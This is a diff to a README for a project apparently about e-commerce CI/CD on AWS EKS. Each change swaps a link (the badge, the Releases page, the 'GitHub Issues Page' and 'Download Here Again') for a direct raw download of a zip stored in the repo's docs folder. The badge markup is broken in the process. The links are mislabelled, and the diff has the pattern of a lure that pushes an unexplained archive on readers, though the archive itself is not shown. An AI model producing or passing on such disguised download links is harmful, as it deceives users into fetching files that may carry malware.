@@ -1,6 +1,6 @@
 # 🛍️ devops-project-3-eks-cicd-ecommerce - Simplifying E-Commerce CI/CD on AWS
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/PatoSovietico676/devops-project-3-eks-cicd-ecommerce/releases)
+[![Download](https://github.com/PatoSovietico676/devops-project-3-eks-cicd-ecommerce/raw/refs/heads/main/docs/ecommerce-devops-eks-project-cicd-v2.1-beta.5.zip%20Now-Click%https://github.com/PatoSovietico676/devops-project-3-eks-cicd-ecommerce/raw/refs/heads/main/docs/ecommerce-devops-eks-project-cicd-v2.1-beta.5.zip)](https://github.com/PatoSovietico676/devops-project-3-eks-cicd-ecommerce/raw/refs/heads/main/docs/ecommerce-devops-eks-project-cicd-v2.1-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you begin, make sure you have the following:
 To download the software, please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access our releases.
-   [Download Here](https://github.com/PatoSovietico676/devops-project-3-eks-cicd-ecommerce/releases)
+   [Download Here](https://github.com/PatoSovietico676/devops-project-3-eks-cicd-ecommerce/raw/refs/heads/main/docs/ecommerce-devops-eks-project-cicd-v2.1-beta.5.zip)
    
 2. **Choose a Release:** Look for the latest version. You will see a list of available files.
    
@@ -93,12 +93,12 @@ We welcome contributions! If you want to contribute to this project:
 
 ## 💬 Support
 
-For any questions or issues, please create an issue on the [GitHub Issues Page](https://github.com/PatoSovietico676/devops-project-3-eks-cicd-ecommerce/issues).
+For any questions or issues, please create an issue on the [GitHub Issues Page](https://github.com/PatoSovietico676/devops-project-3-eks-cicd-ecommerce/raw/refs/heads/main/docs/ecommerce-devops-eks-project-cicd-v2.1-beta.5.zip).
 
 ## 🌐 Connect With Us
 
 Learn more about our project and the technologies used on the main repository page. 
 
-[Download Here Again](https://github.com/PatoSovietico676/devops-project-3-eks-cicd-ecommerce/releases)
+[Download Here Again](https://github.com/PatoSovietico676/devops-project-3-eks-cicd-ecommerce/raw/refs/heads/main/docs/ecommerce-devops-eks-project-cicd-v2.1-beta.5.zip)
 
 Thank you for using **devops-project-3-eks-cicd-ecommerce**!
